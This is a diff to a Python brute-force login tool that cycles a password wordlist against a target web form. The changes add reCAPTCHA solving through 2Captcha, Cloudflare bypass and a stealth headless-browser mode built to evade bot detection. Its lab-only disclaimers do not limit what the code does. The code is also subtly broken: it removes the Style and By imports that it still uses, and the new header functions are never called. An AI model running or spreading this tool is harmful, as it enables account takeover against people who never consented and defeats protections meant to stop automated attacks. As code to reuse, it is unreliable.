@@ -7,28 +7,63 @@ import time
 import urllib3
 import os
 from bs4 import BeautifulSoup
-from selenium import webdriver
-from selenium.webdriver.common.by import By
-from selenium.webdriver.chrome.options import Options
-from selenium.webdriver.chrome.service import Service as ChromeService
-from webdriver_manager.chrome import ChromeDriverManager
-from colorama import Fore, Style, init
+from colorama import Fore, init
 from twocaptcha import TwoCaptcha  # CAPTCHA solver (2Captcha)
+import undetected_chromedriver as uc
 
 # Initialize colorama
 init(autoreset=True)
-
 urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
 
-# Default headers
 HEADERS = {
-    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Safari/537.36",
+    "User-Agent": ("Mozilla/5.0 (Windows NT 10.0; Win64; x64) "
+                   "AppleWebKit/537.36 (KHTML, like Gecko) "
+                   "Chrome/115.0.0.0 Safari/537.36"),
     "Content-Type": "application/x-www-form-urlencoded"
 }
 
 CAPTCHA_KEYWORDS = ["captcha", "verify", "recaptcha", "i'm not a robot"]
 
-# === Auto-detect form fields ===
+# Display the header with colors
+def print_header():
+    print(Fore.YELLOW + Style.BRIGHT + """
+    ********************************************
+    *                                          *
+    *    Brute Force Login Tool (CLI)          *
+    *    Author: De Nafman                     *
+    *    For Educational and Ethical Hacking   *
+    *                                          *
+    ********************************************
+
+            Welcome to Brute Lab!
+
+    =====================================================
+    ⚠️  DISCLAIMER: This tool is intended solely for ethical hacking purposes within controlled lab environments only.
+    ⚠️  Make sure you have legal permission to test any system.
+    =====================================================
+
+    Select from the available options to proceed:
+
+    -- `basic` Mode: Uses standard HTTP POST requests for basic login forms.
+    -- `cloudflare` Mode: Uses cloudscraper to bypass Cloudflare's JS challenge.
+    -- `browser` Mode: Automates a real browser using Selenium (headless mode) for full form submission and CAPTCHA bypass.
+
+    Instructions:
+    1. Enter the target URL for the login form.
+    2. Provide the username to brute-force.
+    3. Provide the path to the password file (wordlist).
+    4. Choose your preferred mode of operation (basic, cloudflare, or browser).
+    5. If using browser mode, specify the path to the ChromeDriver.
+    6. If using cloudflare mode , provide 2captcha api-key.
+
+    Example usage:
+      python Brute_lab.py http://example.com/login user /path/to/wordlist.txt --mode browser --driver /path/to/chromedriver
+    """)
+
+# Pause before proceeding
+def pause_for_user_input():
+    input(Fore.CYAN + "\nPress Enter to continue with the brute force operation...")
+
 def detect_form_fields(url):
     try:
         res = requests.get(url, headers=HEADERS, verify=False, timeout=10)
@@ -37,22 +72,19 @@ def detect_form_fields(url):
         if not form:
             print(Fore.RED + "[!] No form detected.")
             return None, None
-
         inputs = form.find_all('input')
         user_field = pass_field = None
-        for input_tag in inputs:
-            name = input_tag.get('name', '').lower()
+        for tag in inputs:
+            name = tag.get('name', '').lower()
             if 'user' in name:
                 user_field = name
             elif 'pass' in name:
                 pass_field = name
-
         return user_field, pass_field
     except Exception as e:
         print(Fore.RED + f"[!] Error detecting form fields: {e}")
         return None, None
 
-# === BASIC Mode ===
 def basic_mode(args, user_field, pass_field):
     print(Fore.CYAN + "[*] Using BASIC mode (requests)")
     for i, password in enumerate(args.wordlist, 1):
@@ -62,7 +94,6 @@ def basic_mode(args, user_field, pass_field):
         except requests.RequestException as e:
             print(Fore.RED + f"[!] Error on attempt {i}: {e}")
             continue
-
         print(Fore.YELLOW + f"[{i}] Trying: {password}")
         if any(k in res.text.lower() for k in CAPTCHA_KEYWORDS):
             print(Fore.RED + "[!] CAPTCHA detected. Skipping.")
@@ -73,10 +104,13 @@ def basic_mode(args, user_field, pass_field):
         time.sleep(1)
     print(Fore.RED + "[-] Password not found.")
 
-# === CLOUDFLARE Mode ===
 def cloudscraper_mode(args, user_field, pass_field):
     print(Fore.CYAN + "[*] Using CLOUDFLARE mode (cloudscraper)")
+    if not args.captcha_api:
+        print(Fore.RED + "[!] Cloudflare mode requires a 2Captcha API key.")
+        return
     scraper = cloudscraper.create_scraper()
+    solver = TwoCaptcha(args.captcha_api)
     for i, password in enumerate(args.wordlist, 1):
         data = {user_field: args.username, pass_field: password}
         try:
@@ -84,174 +118,154 @@ def cloudscraper_mode(args, user_field, pass_field):
         except Exception as e:
             print(Fore.RED + f"[!] Error on attempt {i}: {e}")
             continue
-
         print(Fore.YELLOW + f"[{i}] Trying: {password}")
-        if any(k in res.text.lower() for k in CAPTCHA_KEYWORDS):
-            print(Fore.RED + "[!] CAPTCHA detected. Skipping.")
-            continue
-        if "incorrect" not in res.text.lower():
+        text = res.text.lower()
+        if "incorrect" not in text:
             print(Fore.GREEN + f"[✅] Password FOUND: {password}")
             return
+        if any(k in text for k in CAPTCHA_KEYWORDS):
+            print(Fore.CYAN + "[*] CAPTCHA detected — solving via 2Captcha...")
+            soup = BeautifulSoup(res.text, "html.parser")
+            iframe = soup.find("iframe", src=lambda x: x and "recaptcha" in x and "k=" in x)
+            if not iframe:
+                print(Fore.RED + "[!] CAPTCHA iframe not found. Skipping.")
+                continue
+            sitekey = iframe["src"].split("k=")[1].split("&")[0]
+            try:
+                result = solver.recaptcha(sitekey=sitekey, url=args.url)
+                token = result.get("code")
+                if not token:
+                    print(Fore.RED + "[!] No token received from 2Captcha.")
+                    continue
+                print(Fore.GREEN + "[+] Injecting CAPTCHA token...")
+                scraper.cookies.set("g-recaptcha-response", token, domain=requests.utils.urlparse(args.url).hostname)
+                res2 = scraper.post(args.url, data=data, headers=HEADERS, timeout=10)
+                if "incorrect" not in res2.text.lower():
+                    print(Fore.GREEN + f"[✅] Password FOUND: {password}")
+                    return
+            except Exception as e:
+                print(Fore.RED + f"[!] 2Captcha error: {e}")
         time.sleep(1)
     print(Fore.RED + "[-] Password not found.")
 
-# === BROWSER Mode with CAPTCHA Support ===
-def selenium_mode(args, user_field, pass_field):
-    print(Fore.CYAN + "[*] Using BROWSER mode (selenium)")
-
-    chrome_options = Options()
-    chrome_options.add_argument("--headless")
-    chrome_options.add_argument("--disable-blink-features=AutomationControlled")
-
+def selenium_stealth_mode(args, user_field, pass_field):
+    print(Fore.CYAN + "[*] Using BROWSER-STEALTH mode (undetected-chromedriver)")
+    if args.captcha_api is None:
+        print(Fore.YELLOW + "[!] No 2Captcha API key provided — CAPTCHA may still block automation.")
     try:
-        service = ChromeService(executable_path=ChromeDriverManager().install())
-        driver = webdriver.Chrome(service=service, options=chrome_options)
+        options = uc.ChromeOptions()
+        options.add_argument("--headless=new")
+        options.add_argument("--disable-blink-features=AutomationControlled")
+        options.add_argument("--no-sandbox")
+        options.add_argument("--disable-gpu")
+        options.add_argument("--disable-dev-shm-usage")
+        options.binary_location = "/usr/bin/chromium"
+        driver = uc.Chrome(
+            options=options,
+            driver_executable_path="/usr/bin/chromedriver",
+            headless=True
+        )
     except Exception as e:
-        print(Fore.RED + f"[!] Selenium error: {e}")
+        print(Fore.RED + f"[!] Stealth Selenium error: {e}")
         return
+    solver = TwoCaptcha(args.captcha_api) if args.captcha_api else None
 
     for i, password in enumerate(args.wordlist, 1):
         try:
             driver.get(args.url)
             time.sleep(2)
-
-            user_input = driver.find_element(By.NAME, user_field)
-            pass_input = driver.find_element(By.NAME, pass_field)
-            submit = driver.find_element(By.XPATH, '//button[@type="submit"]')
-
-            user_input.clear()
-            pass_input.clear()
-            user_input.send_keys(args.username)
-            pass_input.send_keys(password)
-            submit.click()
-
+            driver.find_element(By.NAME, user_field).clear()
+            driver.find_element(By.NAME, pass_field).clear()
+            driver.find_element(By.NAME, user_field).send_keys(args.username)
+            driver.find_element(By.NAME, pass_field).send_keys(password)
+            driver.find_element(By.XPATH, '//button[@type="submit"]').click()
             time.sleep(2)
             page_text = driver.page_source.lower()
             print(Fore.YELLOW + f"[{i}] Trying: {password}")
-
-            if any(k in page_text for k in CAPTCHA_KEYWORDS):
-                print(Fore.YELLOW + "[!] CAPTCHA detected.")
-
-                if args.captcha_api:
-                    print(Fore.CYAN + "[*] Attempting CAPTCHA bypass via 2Captcha...")
-
-                    solver = TwoCaptcha(args.captcha_api)
-
-                    site_key = None
-                    for iframe in driver.find_elements(By.TAG_NAME, 'iframe'):
-                        src = iframe.get_attribute('src')
-                        if 'recaptcha' in src and 'k=' in src:
-                            site_key = src.split('k=')[1].split('&')[0]
-                            break
-
-                    if not site_key:
-                        print(Fore.RED + "[!] CAPTCHA sitekey not found.")
-                        continue
-
-                    try:
-                        result = solver.recaptcha(sitekey=site_key, url=args.url)
-                        token = result['code']
-
-                        driver.execute_script("""
-                            document.getElementById("g-recaptcha-response").style.display = "block";
-                            document.getElementById("g-recaptcha-response").value = arguments[0];
-                        """, token)
-
-                        print(Fore.GREEN + "[+] CAPTCHA solved and token injected.")
-                        submit.click()
-                        time.sleep(2)
-                        page_text = driver.page_source.lower()
-
-                    except Exception as e:
-                        print(Fore.RED + f"[!] CAPTCHA solving failed: {e}")
-                        continue
-                else:
-                    print(Fore.RED + "[!] Skipping CAPTCHA as no API key was provided.")
-                    continue
-
-            if "incorrect" not in page_text:
+            if "incorrect" not in page_text and not any(k in page_text for k in CAPTCHA_KEYWORDS):
                 print(Fore.GREEN + f"[✅] Password FOUND: {password}")
                 driver.quit()
                 return
-
+            if any(k in page_text for k in CAPTCHA_KEYWORDS):
+                print(Fore.CYAN + "[*] CAPTCHA detected—attempting 2Captcha fallback...")
+                if solver:
+                    sitekey = None
+                    for iframe in driver.find_elements(By.TAG_NAME, "iframe"):
+                        src = iframe.get_attribute("src")
+                        if "recaptcha" in src and "k=" in src:
+                            sitekey = src.split("k=")[1].split("&")[0]
+                            break
+                    if not sitekey:
+                        print(Fore.RED + "[!] CAPTCHA sitekey not found. Skipping.")
+                        continue
+                    try:
+                        result = solver.recaptcha(sitekey=sitekey, url=args.url)
+                        token = result.get("code")
+                        if not token:
+                            print(Fore.RED + "[!] No token from 2Captcha.")
+                            continue
+                        driver.execute_script(
+                            'document.getElementById("g-recaptcha-response").style.display = "block";'
+                            'document.getElementById("g-recaptcha-response").value = arguments[0];',
+                            token
+                        )
+                        print(Fore.GREEN + "[+] Token injected—retry submitting...")
+                        driver.find_element(By.XPATH, '//button[@type="submit"]').click()
+                        time.sleep(2)
+                        page_text = driver.page_source.lower()
+                        if "incorrect" not in page_text:
+                            print(Fore.GREEN + f"[✅] Password FOUND: {password}")
+                            driver.quit()
+                            return
+                    except Exception as e:
+                        print(Fore.RED + f"[!] 2Captcha error: {e}")
+                else:
+                    print(Fore.RED + "[!] No 2Captcha key—cannot solve CAPTCHA in stealth mode.")
         except Exception as e:
-            print(Fore.RED + f"[!] Selenium error on attempt {i}: {e}")
+            print(Fore.RED + f"[!] Stealth Selenium error on attempt {i}: {e}")
             continue
-
     driver.quit()
     print(Fore.RED + "[-] Password not found.")
 
-# === CLI Entry Point ===
 def main():
     print(Fore.GREEN + """
 ==============================================
  Brute-Lab - Brute-force Login Testing Tool
- Author: De Nafman
  Version: 1.0
 ==============================================
-
-[!] WARNING: This tool is intended for use ONLY in controlled environments such as penetration testing labs WITH legal authorization. 
-Unauthorized use may violate laws and ethical standards.
+WARNING: Use only with legal authorization.
 """)
-    
-    user_input = input(Fore.YELLOW + "Press [Enter] to continue or [Q] to quit: ")
-    if user_input.strip().lower() == "q":
+    if input(Fore.YELLOW + "Press [Enter] to continue or [Q] to quit: ").strip().lower() == "q":
         print(Fore.RED + "[!] Exiting...")
-        exit()
+        return
 
-    print(Fore.GREEN + """
-Usage Information:
-
-Modes:
-  basic      → Simple POST requests
-  cloudflare → Uses cloudscraper to bypass Cloudflare
-  browser    → Full browser emulation via Selenium (supports CAPTCHA)
-
-Examples:
-  python Brute_lab.py http://example.com/login admin passlist.txt
-  python Brute_lab.py http://example.com/login admin passlist.txt --mode cloudflare
-  python Brute_lab.py http://example.com/login admin passlist.txt --mode browser --captcha-api YOUR_2CAPTCHA_API_KEY
-
-Note:
-- CAPTCHA bypass works only with reCAPTCHA v2.
-- ChromeDriver is auto-managed via webdriver-manager.
-""")
-
-    parser = argparse.ArgumentParser(
-        description="Brute-force login CLI tool for ethical hacking labs\nAuthor: De Nafman",
-        formatter_class=argparse.RawTextHelpFormatter
-    )
+    parser = argparse.ArgumentParser(formatter_class=argparse.RawTextHelpFormatter)
     parser.add_argument("url", help="Target login URL")
-    parser.add_argument("username", help="Username to brute-force")
+    parser.add_argument("username", help="Username to brute‑force")
     parser.add_argument("passwords", help="Path to password file")
-    parser.add_argument("-m", "--mode", choices=["basic", "cloudflare", "browser"], default="basic",
-                        help="Select brute-force mode")
-    parser.add_argument("--captcha-api", help="2Captcha API key (for browser mode CAPTCHA solving)")
-    parser.add_argument("-d", "--driver", default="chromedriver", help="ChromeDriver path (not required with webdriver-manager)")
-
+    parser.add_argument("-m", "--mode", choices=["basic", "cloudflare", "browser-stealth"], default="basic")
+    parser.add_argument("--captcha-api", help="2Captcha API key (required for Cloudflare and recommended for stealth mode)")
     args = parser.parse_args()
 
     if not os.path.exists(args.passwords):
         print(Fore.RED + "[!] Password file not found.")
         return
-
     with open(args.passwords, "r", encoding="utf-8", errors="ignore") as f:
         args.wordlist = f.read().splitlines()
 
     user_field, pass_field = detect_form_fields(args.url)
     if not user_field or not pass_field:
-        print(Fore.RED + "[!] Could not auto-detect form fields.")
+        print(Fore.RED + "[!] Could not detect form fields.")
         user_field = input("Enter username field name: ")
         pass_field = input("Enter password field name: ")
-
     print(Fore.CYAN + f"[*] Using fields: username='{user_field}', password='{pass_field}'")
 
     if args.mode == "basic":
         basic_mode(args, user_field, pass_field)
     elif args.mode == "cloudflare":
         cloudscraper_mode(args, user_field, pass_field)
-    elif args.mode == "browser":
-        selenium_mode(args, user_field, pass_field)
+    elif args.mode == "browser-stealth":
+        selenium_stealth_mode(args, user_field, pass_field)
 
 if __name__ == "__main__":
     main()
